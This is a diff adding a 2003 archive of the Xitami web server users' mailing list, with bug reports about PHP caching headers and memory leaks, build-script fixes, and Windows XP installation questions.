@@ -1,0 +1,3981 @@
+From xitami@lists.xitami.org  Tue Dec  2 15:25:04 2003
+From: xitami@lists.xitami.org (Craig Morrison)
+Date: Tue, 02 Dec 2003 10:25:04 -0500
+Subject: [Xitami] Memory leak problems..
+Message-ID: <3FCCAED0.8040502@2cah.com>
+
+Just last night I was notified that Xitami Pro was dying a nasty death 
+on me..
+
+Windows 2000 Server, latest service packs, running Xitami Pro 2.4d9. 
+Other software of note, Microsoft's DNS server, PHP, MySQL and a POL 
+(Ultima Online) server.
+
+The message in my event logs was something along the lines of "Memory 
+leak, check memtrace.lst"
+
+I can email the memtrace.lst if necessary, I looked at it and it didn't 
+tell me much of anything.
+
+The only clue I have is that I had some "person" submitting multiple 
+requests for the same file in rapid succession. Some 2000+ requests in a 
+little less than 12 hours. The file does exist and is ~2MB in size. At a 
+few points in time there were 30 open connections to the same IP for 
+this file. Xitami would die during those periods.
+
+I'm not really sure what information is needed, let me know and I'll do 
+my best to provide it.
+
+-- 
+Craig Morrison
+
+http://www.mtsprofessional.com/
+   A Win32 email server that works for You.
+
+
+
+From xitami@lists.xitami.org  Thu Dec  4 01:09:53 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Thu, 4 Dec 2003 01:09:53 -0000
+Subject: [Xitami] change of behaviours / bug?
+Message-ID: <VPOP32.0.0h.20031204010953.912.224.1.b4eea9b9@mail.ozin.com>
+
+Updated two of my servers (Win 2000) a few days ago to Xitami 2.5c0 from
+2.4.d9
+
+I didn't find any real problems (apart from the fact that the exe's had
+changed names - including the one that runs the service).
+
+But this evening I've realised that the way it handles php pages has changed
+completely. The server headers must have changed as all my dynamic PHP pages
+are being cached on all platforms!!!  
+
+Just done a header check and 2.5c0 is passing the modified date of the
+actual raw php file in the Last-modified: header as if it were an html file.
+This can't be right, can it?!!! 
+
+Presumably 2.4.d9 didn't do this?
+
+Adding a line:
+
+Last-modified:
+
+to .\headers\header.php doesnt help
+
+Help please!!! All my sites are now sick.
+
+
+Jason Ozin
+Technica Solutions
+
+
+From xitami@lists.xitami.org  Thu Dec  4 10:13:03 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Thu, 04 Dec 2003 10:13:03 +0000
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo>
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo>
+Message-ID: <3FCF08AF.20805@tec1.co.uk>
+
+further to the report below I've done some tests and here is a new full 
+report:
+
+updated two of my servers (Win 2000) a few days ago to Xitami 2.5c0 from 
+2.4.d9
+
+I didn't find any real problems (apart from the fact that the exe's had 
+changed names - including the one that runs the service).
+
+But yesterday I realised that the way it handles PHP pages has changed 
+completely. The server now sends the wrong headers as all my dynamic PHP 
+pages are being cached on all platforms and all clients!!!
+
+So I did a header check and 2.5c0 is passing the modified date of the
+actual raw php file in the Last-modified: header as if it were an html
+file.
+
+This can't be right, can it?!!!
+Presumably 2.4.d9 didn't do this?
+
+Adding a line:
+
+Last-modified: etc...
+
+to .\headers\header.php doesn't help in any way
+
+and adding:
+
+header ("Last-Modified: Mon, 30 May 2003 00:00:00 GMT");
+
+to the start of a php file as a test makes no difference either. It's 
+still the modified date of the actual raw php file thats passed in the 
+header.
+
+Help!!!!
+
+
+From xitami@lists.xitami.org  Thu Dec  4 13:15:03 2003
+From: xitami@lists.xitami.org (Euman)
+Date: Thu, 4 Dec 2003 08:15:03 -0500
+Subject: [Xitami] Serious bug in my opinion
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo> <3FCF08AF.20805@tec1.co.uk>
+Message-ID: <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t>
+
+WWVhaCwgMi41YzAgaXMgc2NyZXdlZCB1cC4uLkl2ZSBtZW50aW9uZWQgdGhpcyBzYW1lIHRoaW5n
+IHdoZW4gaXQgZmlyc3QgY2FtZSBvdXQuDQood2l0aCBhIHJlcGx5IHRvIGNoYW5nZSBleGFjdGx5
+IHdoYXQgeW91IGNoYW5nZWQsIHdpY2ggd2FzIG5vIHNvbHV0aW9uIG1pbmQgeW91KQ0KSXZlIHNp
+bmNlIGluc3RhbGxlZCBBcGFjaGUgYW5kIGV2ZXJ5dGhpbmcgaXMgYXMgaXQgc2hvdWxkIGJlLi4u
+DQpHb29kIGx1Y2suLi4NCg0KDQotLS0tLSBPcmlnaW5hbCBNZXNzYWdlIC0tLS0tIA0KRnJvbTog
+Ikphc29uIE96aW4gYXQgVGVjaG5pY2EgU29sdXRpb25zIiA8amFzb25AdGVjMS5jby51az4NClRv
+OiA8eGl0YW1pQGxpc3RzLnhpdGFtaS5vcmc+DQpTZW50OiBUaHVyc2RheSwgRGVjZW1iZXIgMDQs
+IDIwMDMgNToxMyBBTQ0KU3ViamVjdDogW1hpdGFtaV0gU2VyaW91cyBidWcgaW4gbXkgb3Bpbmlv
+bg0KDQoNCj4gZnVydGhlciB0byB0aGUgcmVwb3J0IGJlbG93IEkndmUgZG9uZSBzb21lIHRlc3Rz
+IGFuZCBoZXJlIGlzIGEgbmV3IGZ1bGwgDQo+IHJlcG9ydDoNCj4gDQo+IHVwZGF0ZWQgdHdvIG9m
+IG15IHNlcnZlcnMgKFdpbiAyMDAwKSBhIGZldyBkYXlzIGFnbyB0byBYaXRhbWkgMi41YzAgZnJv
+bSANCj4gMi40LmQ5DQo+IA0KPiBJIGRpZG4ndCBmaW5kIGFueSByZWFsIHByb2JsZW1zIChhcGFy
+dCBmcm9tIHRoZSBmYWN0IHRoYXQgdGhlIGV4ZSdzIGhhZCANCj4gY2hhbmdlZCBuYW1lcyAtIGlu
+Y2x1ZGluZyB0aGUgb25lIHRoYXQgcnVucyB0aGUgc2VydmljZSkuDQo+IA0KPiBCdXQgeWVzdGVy
+ZGF5IEkgcmVhbGlzZWQgdGhhdCB0aGUgd2F5IGl0IGhhbmRsZXMgUEhQIHBhZ2VzIGhhcyBjaGFu
+Z2VkIA0KPiBjb21wbGV0ZWx5LiBUaGUgc2VydmVyIG5vdyBzZW5kcyB0aGUgd3JvbmcgaGVhZGVy
+cyBhcyBhbGwgbXkgZHluYW1pYyBQSFAgDQo+IHBhZ2VzIGFyZSBiZWluZyBjYWNoZWQgb24gYWxs
+IHBsYXRmb3JtcyBhbmQgYWxsIGNsaWVudHMhISENCj4gDQo+IFNvIEkgZGlkIGEgaGVhZGVyIGNo
+ZWNrIGFuZCAyLjVjMCBpcyBwYXNzaW5nIHRoZSBtb2RpZmllZCBkYXRlIG9mIHRoZQ0KPiBhY3R1
+YWwgcmF3IHBocCBmaWxlIGluIHRoZSBMYXN0LW1vZGlmaWVkOiBoZWFkZXIgYXMgaWYgaXQgd2Vy
+ZSBhbiBodG1sDQo+IGZpbGUuDQo+IA0KPiBUaGlzIGNhbid0IGJlIHJpZ2h0LCBjYW4gaXQ/ISEh
+DQo+IFByZXN1bWFibHkgMi40LmQ5IGRpZG4ndCBkbyB0aGlzPw0KPiANCj4gQWRkaW5nIGEgbGlu
+ZToNCj4gDQo+IExhc3QtbW9kaWZpZWQ6IGV0Yy4uLg0KPiANCj4gdG8gLlxoZWFkZXJzXGhlYWRl
+ci5waHAgZG9lc24ndCBoZWxwIGluIGFueSB3YXkNCj4gDQo+IGFuZCBhZGRpbmc6DQo+IA0KPiBo
+ZWFkZXIgKCJMYXN0LU1vZGlmaWVkOiBNb24sIDMwIE1heSAyMDAzIDAwOjAwOjAwIEdNVCIpOw0K
+PiANCj4gdG8gdGhlIHN0YXJ0IG9mIGEgcGhwIGZpbGUgYXMgYSB0ZXN0IG1ha2VzIG5vIGRpZmZl
+cmVuY2UgZWl0aGVyLiBJdCdzIA0KPiBzdGlsbCB0aGUgbW9kaWZpZWQgZGF0ZSBvZiB0aGUgYWN0
+dWFsIHJhdyBwaHAgZmlsZSB0aGF0cyBwYXNzZWQgaW4gdGhlIA0KPiBoZWFkZXIuDQo+IA0KPiBI
+ZWxwISEhIQ0KPiANCj4gDQo+IC0tDQo+IFhpdGFtaSBVc2VycyBNYWlsaW5nIExpc3QgLS0gRm9y
+IFhpdGFtaSBzdXBwb3J0DQo+IFRvIHVuc3Vic2NyaWJlOiBodHRwOi8vbGlzdHMueGl0YW1pLm9y
+Zy9tYWlsbWFuL2xpc3RpbmZvL3hpdGFtaQ==
+
+
+From xitami@lists.xitami.org  Thu Dec  4 15:34:09 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Thu, 04 Dec 2003 15:34:09 +0000
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t>
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo> <3FCF08AF.20805@tec1.co.uk> <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t>
+Message-ID: <3FCF53F1.30604@tec1.co.uk>
+
+That's sad. I would have thought such a serious bug would have been 
+dealt with immediately.
+
+If effectively makes Xitami useless for serving dynamic pages.
+
+Any comments from the Xitami guys?
+
+Euman wrote:
+> Yeah, 2.5c0 is screwed up...Ive mentioned this same thing when it first came out.
+> (with a reply to change exactly what you changed, wich was no solution mind you)
+> Ive since installed Apache and everything is as it should be...
+> Good luck...
+
+From xitami@lists.xitami.org  Thu Dec  4 17:50:02 2003
+From: xitami@lists.xitami.org (Chestnut)
+Date: Thu, 4 Dec 2003 09:50:02 -0800
+Subject: [Xitami] Serious bug in my opinion
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo> <3FCF08AF.20805@tec1.co.uk> <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t> <3FCF53F1.30604@tec1.co.uk>
+Message-ID: <000e01c3ba8f$0be45970$5ac6ff40@2c01v01>
+
+Why not back step and use 2.4d10??
+Using it for intranet applications with no problem at all, database access
+with php and display of data no problem.
+----- Original Message ----- 
+From: "Jason Ozin at Technica Solutions" <jason@tec1.co.uk>
+To: <xitami@lists.xitami.org>
+Sent: Thursday, December 04, 2003 7:34 AM
+Subject: Re: [Xitami] Serious bug in my opinion
+
+
+> That's sad. I would have thought such a serious bug would have been
+> dealt with immediately.
+>
+> If effectively makes Xitami useless for serving dynamic pages.
+>
+> Any comments from the Xitami guys?
+>
+> Euman wrote:
+> > Yeah, 2.5c0 is screwed up...Ive mentioned this same thing when it first
+came out.
+> > (with a reply to change exactly what you changed, wich was no solution
+mind you)
+> > Ive since installed Apache and everything is as it should be...
+> > Good luck...
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+
+From xitami@lists.xitami.org  Thu Dec  4 22:25:23 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Thu, 4 Dec 2003 22:25:23 -0000
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <000e01c3ba8f$0be45970$5ac6ff40@2c01v01>
+Message-ID: <VPOP32.0.0h.20031204222523.458.2ed.1.b4eea9b9@mail.ozin.com>
+
+ > Why not back step and use 2.4d10??
+
+Indeed. However look at www.xitami.com 2.5c0 is advertised as the current
+release, recommended, maintained, secure and stable. But we see that the
+people who make these claims haven't responded to a very serious bug that
+has been reported more than once. The claims made for 2.5c0 need to be
+downgraded (or the version withdrawn) until they have fixed this bug.
+Otherwise others will be tempted to upgrade prior 2.4 versions to this
+broken version as I did and waste hours of their valuable time.
+
+
+
+From xitami@lists.xitami.org  Thu Dec  4 19:04:52 2003
+From: xitami@lists.xitami.org (Brian {Hamilton Kelly})
+Date: Thu, 4 Dec 2003 19:04:52 +0000 (GMT)
+Subject: [Xitami] Serious bug in my opinion
+Message-ID: <54444@dsl.co.uk>
+
+In message <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t>
+   "Euman" writes:
+
+> WWVhaCwgMi41YzAgaXMgc2NyZXdlZCB1cC4uLkl2ZSBtZW50aW9uZWQgdGhpcyBzYW1lIHRoaW5n
+> IHdoZW4gaXQgZmlyc3QgY2FtZSBvdXQuDQood2l0aCBhIHJlcGx5IHRvIGNoYW5nZSBleGFjdGx5
+etc.
+
+Do you suppose you could learn how properly to use a mailer?  There
+really is absolutely NO need to Base64 encode your words of wisdom.
+
+-- 
+Brian {Hamilton Kelly}                                          bhk@dsl.co.uk
+    "We can no longer stand apart from Europe if we would.  Yet we are
+    untrained to mix with our neighbours, or even talk to them".
+                                              George Macaulay Trevelyan, 1919
+
+From xitami@lists.xitami.org  Fri Dec  5 07:10:37 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Fri, 05 Dec 2003 08:10:37 +0100
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <54444@dsl.co.uk>
+Message-ID: <5.1.0.14.2.20031205080857.01dd71f0@verfaillie4.verfaillie.local>
+
+At 20:04 4/12/03, Brian {Hamilton Kelly} <bhk@dsl.co.uk> wrote:
+>In message <000601c3ba68$a343cac0$6400a8c0@z91aohkh2ot5r6t>
+>    "Euman" writes:
+>
+> > 
+> WWVhaCwgMi41YzAgaXMgc2NyZXdlZCB1cC4uLkl2ZSBtZW50aW9uZWQgdGhpcyBzYW1lIHRoaW5n
+> > 
+> IHdoZW4gaXQgZmlyc3QgY2FtZSBvdXQuDQood2l0aCBhIHJlcGx5IHRvIGNoYW5nZSBleGFjdGx5
+>etc.
+>
+>Do you suppose you could learn how properly to use a mailer?  There
+>really is absolutely NO need to Base64 encode your words of wisdom.
+
+It is a standard feature of new MUAs to get past anti-spam engines :-) :-) :-)
+
+
+--::Mailserver Verfaillie Bauwens::-- contact [postmaster@verfaillie.com]
+Alle mails gecontroleerd op virussen. Virusdefinities dagelijks aangepast.
+http://www.verfaillie.com
+
+From xitami@lists.xitami.org  Thu Dec  4 08:17:56 2003
+From: xitami@lists.xitami.org (WhiteShepherd)
+Date: Thu, 04 Dec 2003 03:17:56 -0500
+Subject: [Xitami] change of behaviours / bug?
+In-Reply-To: <VPOP32.0.0h.20031204010953.912.224.1.b4eea9b9@mail.ozin.com>
+Message-ID: <3FCEA764.31982.26D6B04E@localhost>
+
+I run a busy art site.  I'm currently running Xitami 2.4.d9 with no 
+problems (save for "The server is busy" error from time to time).  I 
+switched to Xitami 2.5.c0 to see if performance was better.  Less 
+server errors but some users got incomplete pages downloading 
+from the site.  It seemed to be isolated to a certain version of IE but 
+I could not confirm that.  Xitami reported a socket error with each 
+broken page.  I switched to 2.4.10 and same error.  2.4.d9 is the 
+only version I can use that doesn't "bump" some of my user base.
+
+I posted two questions earlier but got no reply.  Anyone else having 
+this problem with the new version?
+
+Gene
+
+On 4 Dec 2003 at 1:09, Jason Ozin at Technica Solutions wrote:
+
+> 
+> Updated two of my servers (Win 2000) a few days ago to Xitami 2.5c0 from
+> 2.4.d9
+> 
+> I didn't find any real problems (apart from the fact that the exe's 
+had
+> changed names - including the one that runs the service).
+> 
+> But this evening I've realised that the way it handles php pages 
+has changed
+> completely. The server headers must have changed as all my 
+dynamic PHP pages
+> are being cached on all platforms!!!  
+> 
+> Just done a header check and 2.5c0 is passing the modified date 
+of the
+> actual raw php file in the Last-modified: header as if it were an 
+html file.
+> This can't be right, can it?!!! 
+> 
+> Presumably 2.4.d9 didn't do this?
+> 
+> Adding a line:
+> 
+> Last-modified:
+> 
+> to .\headers\header.php doesnt help
+> 
+> Help please!!! All my sites are now sick.
+> 
+> 
+> Jason Ozin
+> Technica Solutions
+> 
+> 
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+
+From xitami@lists.xitami.org  Fri Dec  5 10:43:22 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Fri, 5 Dec 2003 11:43:22 +0100
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <3FCF08AF.20805@tec1.co.uk>
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo>
+Message-ID: <3FD06F5A.28818.92AE15E@localhost>
+
+Jason Ozin at Technica Solutions <jason@tec1.co.uk> wrote:
+
+> So I did a header check and 2.5c0 is passing the modified date of the
+> actual raw php file in the Last-modified: header as if it were an html
+> file.
+> 
+> This can't be right, can it?!!!
+> Presumably 2.4.d9 didn't do this?
+
+This is indeed not right.  This will be fixed asap, thank you for 
+pointing out this problem.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Fri Dec  5 10:58:17 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Fri, 05 Dec 2003 10:58:17 +0000
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <3FD06F5A.28818.92AE15E@localhost>
+References: <001501c3ba03$530635d0$1564a8c0@troy.ozin.foo> <3FD06F5A.28818.92AE15E@localhost>
+Message-ID: <3FD064C9.7020705@tec1.co.uk>
+
+Pieter Hintjens wrote:
+
+> This is indeed not right.  This will be fixed asap, thank you for 
+> pointing out this problem.
+
+Wonderful. Will you post here when the problem is sorted or maybe even 
+send me an email.
+
+From xitami@lists.xitami.org  Fri Dec  5 12:11:31 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Fri, 5 Dec 2003 13:11:31 +0100
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <3FD064C9.7020705@tec1.co.uk>
+References: <3FD06F5A.28818.92AE15E@localhost>
+Message-ID: <3FD08403.18122.97B978A@localhost>
+
+Jason Ozin at Technica Solutions <jason@tec1.co.uk> wrote:
+
+> Wonderful. Will you post here when the problem is sorted or maybe even
+> send me an email.
+
+Ironically the problem was actually a feature, added specifically to 
+allow filtered pages to be cached.  It does, of course, not make 
+sense to cache dynamic output, and this 'feature' has now been 
+surgically removed.
+
+There are a couple of other changes in 2.5c1, which will be out later 
+today, the most useful being a redirection feature that lets you send 
+any alias to some other URL.
+
+We'll post a message here when the new release is available.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Fri Dec  5 12:28:14 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Fri, 5 Dec 2003 13:28:14 +0100
+Subject: [Xitami] Serious bug in my opinion
+In-Reply-To: <3FD08403.18122.97B978A@localhost>
+References: <3FD064C9.7020705@tec1.co.uk>
+Message-ID: <3FD087EE.11622.98AE516@localhost>
+
+"Pieter Hintjens" <ph@imatix.com>:
+
+> We'll post a message here when the new release is available.
+
+And it is now online at the usual place.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Fri Dec  5 17:53:16 2003
+From: xitami@lists.xitami.org (Jacob Dahl Pind)
+Date: 5 Dec 2003 18:53:16 +0100
+Subject: [Xitami] xiopen Unix
+Message-ID: <336.469T800T11332368rachael@rachael.dyndns.org>
+
+have anyone managed to compile xitami on a nix system lately ? 
+to me it seems as the boomake file is calling a file called c
+which is missing in the xiopen once, it was there in the old 
+24d9
+
+Regards Jacob Dahl Pind
+
+--
+		CBM, Amiga,Vintage hardware collector
+		  Email: rachael@rachael.dyndns.org
+		   url: http://rachael.dyndns.org
+
+
+From xitami@lists.xitami.org  Sat Dec  6 19:04:16 2003
+From: xitami@lists.xitami.org (dwiebe@cfl.rr.com)
+Date: Sat, 6 Dec 2003 14:04:16 -0500
+Subject: [Xitami] Is Windows XP supported
+Message-ID: <191690-2200312661941672@M2W077.mail2web.com>
+
+Some of the site info states Windows XP, but then it's not mentioned in th=
+e
+other info=2E  Does anyone know?  I'm trying to install locally to test
+Perl/CGI scripts=2E
+
+Thanks
+
+--------------------------------------------------------------------
+mail2web - Check your email from the web at
+http://mail2web=2Ecom/ =2E
+
+
+
+From xitami@lists.xitami.org  Sun Dec  7 00:42:11 2003
+From: xitami@lists.xitami.org (Stuart Duckworth)
+Date: Sun, 7 Dec 2003 00:42:11 +0000
+Subject: [Xitami] Is Windows XP supported
+In-Reply-To: <191690-2200312661941672@M2W077.mail2web.com>
+References: <191690-2200312661941672@M2W077.mail2web.com>
+Message-ID: <200312070042.11730.itservices@blueyonder.co.uk>
+
+On Saturday 06 December 2003 19:04, dwiebe@cfl.rr.com wrote:
+> Some of the site info states Windows XP, but then it's not
+> mentioned in the other info.  Does anyone know?  I'm trying to
+> install locally to test Perl/CGI scripts.
+
+I have Xitami installed on a XP Pro machine for a LAN, works fine 
+as a service.
+
+Stuart
+
+From xitami@lists.xitami.org  Sun Dec  7 03:20:05 2003
+From: xitami@lists.xitami.org (Dale Wiebe)
+Date: Sat, 6 Dec 2003 22:20:05 -0500
+Subject: [Xitami] Which Xitami file do you download to install on Windows XP Platform?
+Message-ID: <000001c3bc71$05f9d010$1902a8c0@dlwtoshiba>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0001_01C3BC47.1D23C810
+Content-Type: text/plain;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+I'm not sure which file is the correct file to download and install on
+XP.  On the Xitami website it lists XP as an option, but the file
+information does not mention XP.
+
+------=_NextPart_000_0001_01C3BC47.1D23C810
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" =
+xmlns:w=3D"urn:schemas-microsoft-com:office:word" =
+xmlns=3D"http://www.w3.org/TR/REC-html40">
+
+<head>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
+charset=3Dus-ascii">
+
+
+<meta name=3DProgId content=3DWord.Document>
+<meta name=3DGenerator content=3D"Microsoft Word 10">
+<meta name=3DOriginator content=3D"Microsoft Word 10">
+<link rel=3DFile-List href=3D"cid:filelist.xml@01C3BC47.19595290">
+<!--[if gte mso 9]><xml>
+ <o:OfficeDocumentSettings>
+  <o:DoNotRelyOnCSS/>
+ </o:OfficeDocumentSettings>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:SpellingState>Clean</w:SpellingState>
+  <w:DocumentKind>DocumentEmail</w:DocumentKind>
+  <w:EnvelopeVis/>
+  <w:Compatibility>
+   <w:BreakWrappedTables/>
+   <w:SnapToGridInCell/>
+   <w:WrapTextWithPunct/>
+   <w:UseAsianBreakRules/>
+  </w:Compatibility>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+span.EmailStyle17
+	{mso-style-type:personal-compose;
+	mso-style-noshow:yes;
+	mso-ansi-font-size:10.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:Arial;
+	mso-ascii-font-family:Arial;
+	mso-hansi-font-family:Arial;
+	mso-bidi-font-family:Arial;
+	color:windowtext;}
+span.SpellE
+	{mso-style-name:"";
+	mso-spl-e:yes;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */=20
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-parent:"";
+	mso-padding-alt:0in 5.4pt 0in 5.4pt;
+	mso-para-margin:0in;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";}
+</style>
+<![endif]-->
+</head>
+
+<body lang=3DEN-US link=3Dblue vlink=3Dpurple =
+style=3D'tab-interval:.5in'>
+
+<div class=3DSection1>
+
+<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
+style=3D'font-size:10.0pt;
+font-family:Arial'>I&#8217;m not sure which file is the correct file to
+download and install on XP.<span style=3D'mso-spacerun:yes'>&nbsp; =
+</span>On the <span
+class=3DSpellE>Xitami</span> website it lists XP as an option, but the =
+file
+information does not mention XP.<o:p></o:p></span></font></p>
+
+</div>
+
+</body>
+
+</html>
+
+------=_NextPart_000_0001_01C3BC47.1D23C810--
+
+
+
+From xitami@lists.xitami.org  Sun Dec  7 09:50:58 2003
+From: xitami@lists.xitami.org (Stuart Duckworth)
+Date: Sun, 7 Dec 2003 09:50:58 +0000
+Subject: [Xitami] Which Xitami file do you download to install on Windows XP Platform?
+In-Reply-To: <000001c3bc71$05f9d010$1902a8c0@dlwtoshiba>
+References: <000001c3bc71$05f9d010$1902a8c0@dlwtoshiba>
+Message-ID: <200312070950.59054.itservices@blueyonder.co.uk>
+
+On Sunday 07 December 2003 03:20, Dale Wiebe wrote:
+> I'm not sure which file is the correct file to download and
+> install on XP.  On the Xitami website it lists XP as an option,
+> but the file information does not mention XP.
+
+I installed Xitami some time ago when there were different 
+installation files for Win98 and XP.  I haven't tried the latest 
+installation but according to the iMatix site it's okay for all 
+versions of Windows.
+
+If you like, I can zip up the old installation files, which I 
+still have, and send them to you, the XP Win installation file is 
+only 741K so should download pretty quickly.
+
+If I was starting now, I'd try the latest release first, though.
+
+Stuart
+
+From xitami@lists.xitami.org  Tue Dec  9 15:03:47 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Tue, 9 Dec 2003 16:03:47 +0100
+Subject: [Xitami] xiopen Unix
+In-Reply-To: <336.469T800T11332368rachael@rachael.dyndns.org>
+Message-ID: <3FD5F263.17999.14A31244@localhost>
+
+"Jacob Dahl Pind" <rachael@rachael.dyndns.org> wrote:
+
+> have anyone managed to compile xitami on a nix system lately ? 
+> to me it seems as the boomake file is calling a file called c
+> which is missing in the xiopen once, it was there in the old 
+> 24d9
+
+The Xitami build process changed.  It is still a single script 
+(build.sh), but you run it at the main Xitami level, not in the 
+xiopen project.
+
+There is however a small problem in the last package, the build.sh 
+script appears to be badly generated.  What it should say is simply 
+this:
+
+cd sfl
+sh boomake build install
+cd ..
+cd gsl
+sh boomake build install
+cd ..
+cd smt
+sh boomake build install
+cd ..
+cd studio
+sh boomake build install
+cd ..
+cd xiadmin
+sh boomake build install
+cd ..
+cd xiopen
+sh boomake build install
+cd ..
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Tue Dec  9 15:18:17 2003
+From: xitami@lists.xitami.org (=?iso-8859-1?Q?=22H=F6ppner=2C_Dierk=22?=)
+Date: Tue, 9 Dec 2003 16:18:17 +0100
+Subject: [Xitami] xiopen Unix
+Message-ID: <F15A23A5EBA5D411A38400D0B7B9EB5F015562C8@nts3040.tib.uni-hannover.de>
+
+Hello,
+
+> cd sfl
+> sh boomake build install
+
+... and if you do this by hand from the command line it says=20
+
+build is not allowed here, state=3Dinitial_check
+
+but only after I changed all the lines in boomake which begin with
+
+[ -n "$exception"] ...
+
+to
+
+[ -n "$exception" ]
+
+greetings=20
+
+Dierk H=F6ppner
+Technische Informationsbibliothek
+Universit=E4tsbibliothek Hannover (TIB/UB)
+EDV / DOD Operating
+Welfengarten 1b, 30167 Hannover
+Tel.: 0511/762-4067, Fax: 0511/762-5881
+Mobil: 0163/762 4067
+E-Mail: dierk.hoeppner@tib-hannover.de
+http://www.tib.uni-hannover.de=20
+
+From xitami@lists.xitami.org  Tue Dec  9 16:47:06 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Tue, 9 Dec 2003 17:47:06 +0100
+Subject: [Xitami] xiopen Unix
+In-Reply-To: <F15A23A5EBA5D411A38400D0B7B9EB5F015562C8@nts3040.tib.uni-hannover.de>
+Message-ID: <3FD60A9A.2874.1501A8EE@localhost>
+
+"H=F6ppner, Dierk" <Dierk.Hoeppner@tib.uni-hannover.de> wrote:
+
+> build is not allowed here, state=3Dinitial_check
+> but only after I changed all the lines in boomake which begin with
+> [ -n "$exception"] ...
+> to
+> [ -n "$exception" ]
+
+Surprisingly this syntax error works on our Debian development and 
+build servers.  It's been fixed now, thanks for the report.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Tue Dec  9 20:28:44 2003
+From: xitami@lists.xitami.org (Charles Duval)
+Date: Tue, 9 Dec 2003 15:28:44 -0500
+Subject: [Xitami] #exec cmd= in Win XP
+References: <20031204001702.4785.69689.Mailman@sxpublic.imatix.net>
+Message-ID: <Law10-OE34v6GWLAWhM00007267@hotmail.com>
+
+I am trying to use a CGI to copy content on one directory to another on my
+Web server to update information on a ramdisk.  I have set the environment
+variable SSI_INSECURE to YES, but it's still not working.  I've tryed 2
+ways:
+
+- Through a compiled CGI program.  If I run the CGI from the DOS command
+prompt, it runs fine.  But when I try to run it from the Browser using
+http://mywebadresse/cgi-bin/doCopy2RamDsk.exe (or even without the .exe) it
+displays the text that I've programed into the CGI, but it does not execute
+my copy command nor does it display an error of some kind.
+
+- Using #exec cmd="c:\windows\system32\xcopy d:\webpages r:\ /e" (remember
+that SSI_INSECURE is set to YES) inside a HTTP page.  I get '[xitami SSI
+: ]' which is an error I beleive.  I've tryed to replace the 'xcopy' command
+with a "dir" or "set" to see if I would get an output of some kind.  But I
+still get the same message: '[xitami SSI : ]'
+
+I use Xitami version 2.5b5 and Windows XP Pro.  Is this a security issue
+with WinXP that does not allow me to run system commands from within a CGI?
